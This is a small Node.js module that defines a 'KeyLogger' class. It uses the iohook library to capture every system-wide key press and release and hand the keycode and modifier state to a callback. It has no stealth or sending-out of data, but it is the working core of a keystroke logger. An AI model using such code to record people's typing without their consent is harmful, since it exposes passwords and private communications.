const iohook = require("iohook");

class KeyLogger {
    #hasStartedKeylogger = false;
    /**
     * KeyLogger Constructor
     * @param {function} callback Callback function when there's a key event
     */
    constructor(callback) {
        if (typeof callback != "function")
            throw new Error("CALLBACK PARAMETER IS NOT OF FUNCTION TYPE");
        this.callback = callback;
    }
    /**
     * Start Keylogger
     */
    start() {
        if (this.#hasStartedKeylogger)
            return "Keylogger has already started!";
        
        iohook.on("keydown", e => {
            this.callback({
                keyEvent: e.type,
				keycode: e.rawcode,
				altKey: e.altKey,
				shiftKey: e.shiftKey,
				ctrlKey: e.ctrlKey,
				metaKey: e.metaKey
            });
        });
        iohook.on("keyup", e => {
			this.callback({
				keyEvent: e.type,
				keycode: e.rawcode,
				altKey: e.altKey,
				shiftKey: e.shiftKey,
				ctrlKey: e.ctrlKey,
				metaKey: e.metaKey
			});
        });

        iohook.start();
        
        this.#hasStartedKeylogger = true;
        return "Started Keylogger";
    }
    /**
     * Stop Keylogger
     */
    stop() {
        if (!this.#hasStartedKeylogger)
            return "Keylogger hasn't started yet!";

        iohook.stop();
        this.#hasStartedKeylogger = false;
        return "Stopped Keylogger";
    }
}

module.exports = KeyLogger;